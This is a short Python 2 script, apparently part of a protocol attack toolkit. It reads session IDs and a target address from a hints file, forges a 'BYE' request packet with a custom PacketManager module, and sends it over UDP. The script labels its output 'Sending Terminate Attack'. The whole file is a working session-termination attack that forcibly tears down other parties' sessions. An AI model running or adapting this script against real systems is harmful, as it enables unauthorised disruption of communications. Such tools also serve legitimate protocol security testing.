import socket, sys
from PacketManager import *

if len(sys.argv)!=2:
	sys.exit("Usage: terminate_session.py <attack_file_hints>")

filename = sys.argv[1]

fd = open(filename,'r')
lines = fd.readlines()
fd.close()
lastline = lines.pop()
if lastline == '\n': lastline = lines.pop()
items = lastline.strip().split('\t')
local_session_ID = int(items[0])
remote_session_ID = int(items[1])
remote_ip = items[2]
remote_port = int(items[3])

clisocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

packet_to_send = OutPacket()
packet_to_send.create_packet(version=1, flags=[0], senderID=20, txlocalID=local_session_ID, txremoteID=remote_session_ID, otype='BYE', ocode='REQUEST')

clisocket.sendto(packet_to_send.build_packet(), (remote_ip, remote_port))
print "Sending Terminate Attack to <%s:%s>" % (remote_ip,str(remote_port))